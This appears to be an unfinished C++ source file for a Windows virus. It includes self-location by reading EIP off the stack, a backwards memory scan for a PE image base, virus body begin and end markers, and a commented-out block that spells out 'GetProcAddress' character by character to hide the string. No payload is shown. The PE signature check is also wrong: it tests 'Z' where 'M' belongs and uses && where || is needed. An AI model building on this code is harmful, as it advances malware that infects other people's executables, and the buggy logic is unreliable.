#include "utils.hpp"

#include <windows.h> //TODO Header can generate entities. Check it

TYPE_SIZE getEIP();

//====================================================================================================
TYPE_SIZE MARKER_BODYBEGIN() {
	TYPE_SIZE curEIP = getEIP();
	const TYPE_SIZE offsetTillFuncBegin = 0x9;
	return curEIP - offsetTillFuncBegin;
}

//====================================================================================================
TYPE_SIZE getEIP() {
	TYPE_SIZE stackCanary;
	TYPE_SIZE* stackIter = &stackCanary;
	return stackIter[3];
}

//====================================================================================================
TYPE_SIZE MARKER_MARKEREXAMPLE() {
	TYPE_SIZE curEIP = getEIP();
	const TYPE_SIZE offsetTillFuncBegin = 0x9;
	return curEIP - offsetTillFuncBegin;
}

//====================================================================================================
bool checkIsPE(TYPE_SIZE addr) {
	if (((char*)addr)[0] != 'Z' && ((char*)addr)[1] != 'M') return false;
	addr +=((_IMAGE_DOS_HEADER*)addr)->e_lfanew;
	if (((char*)addr)[0] != 'P' && ((char*)addr)[1] != 'E') return false;
	return true;
}

//====================================================================================================
TYPE_SIZE getPEImageBase(TYPE_SIZE addressSomewhereInModule) {
	addressSomewhereInModule &= 0xFFFF0000;
	while (false == checkIsPE(addressSomewhereInModule)) { addressSomewhereInModule -= 0x10000; }
	return addressSomewhereInModule;
}

int main() {
	int i;
	++i;
	/*
	TYPE_SIZE stackCanary;
	TYPE_SIZE* stackIter = &stackCanary;

	CVirusData dataObject;


	TYPE_SIZE pVirusBodyBegin = MARKER_BODYBEGIN();
	TYPE_SIZE pVirusBodyEnd = MARKER_BODYEND();

	//Initializing functions names
	//GetProcAddress
	dataObject.funcname_GetProcAddress[0] = 'G';
	dataObject.funcname_GetProcAddress[1] = 'e';
	dataObject.funcname_GetProcAddress[2] = 't';
	dataObject.funcname_GetProcAddress[3] = 'P';
	dataObject.funcname_GetProcAddress[4] = 'r';
	dataObject.funcname_GetProcAddress[5] = 'o';
	dataObject.funcname_GetProcAddress[6] = 'c';
	dataObject.funcname_GetProcAddress[7] = 'A';
	dataObject.funcname_GetProcAddress[8] = 'd';
	dataObject.funcname_GetProcAddress[9] = 'd';
	dataObject.funcname_GetProcAddress[10] = 'r';
	dataObject.funcname_GetProcAddress[11] = 'e';
	dataObject.funcname_GetProcAddress[12] = 's';
	dataObject.funcname_GetProcAddress[13] = 's';
	dataObject.funcname_GetProcAddress[14] = '\0';
	*/

}

TYPE_SIZE MARKER_BODYEND() {
	TYPE_SIZE curEIP = getEIP();
	const TYPE_SIZE offsetTillFuncEnd = 0x14;
	return curEIP + offsetTillFuncEnd;
}